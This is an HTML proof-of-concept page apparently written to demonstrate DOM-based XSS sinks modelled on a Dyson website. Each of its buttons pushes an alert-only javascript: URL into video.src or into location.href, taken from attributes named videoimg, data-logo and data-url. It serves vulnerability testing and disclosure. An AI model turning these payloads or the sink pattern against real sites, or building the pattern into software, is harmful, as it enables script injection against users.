<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Dyson DOM XSS PoC</title>
    <style>
      button { margin: 10px; padding: 10px; font-size: 16px; }
    </style>
  </head>
  <body>
    <h2>Dyson DOM XSS Test</h2>
    <button onclick="exploitVideoURL()">Exploit videourl + video.src</button>
    <button onclick="exploitVideoImg()">Exploit videoimg + location.href</button>
    <button onclick="exploitDataLogo()">Exploit data-logo + location.href</button>
    <button onclick="exploitDataURL()">Exploit data-url + location.href</button>

    <div class="video_boxs pdp" videoimg="javascript:alert('videoimg XSS')"></div>
    <div class="video_section" data-logo="javascript:alert('data-logo XSS')"></div>
    <div class="video_section" data-url="javascript:alert('data-url XSS')"></div>
    <video id="dyson-video" width="320" height="240" controls></video>

    <script>
      function exploitVideoURL() {
        document.getElementById("dyson-video").src = "javascript:alert('video.src XSS')";
      }
      function exploitVideoImg() {
        location.href = document.querySelector(".video_boxs.pdp").getAttribute("videoimg");
      }
      function exploitDataLogo() {
        location.href = document.querySelector("[data-logo]").getAttribute("data-logo");
      }
      function exploitDataURL() {
        location.href = document.querySelector("[data-url]").getAttribute("data-url");
      }
    </script>
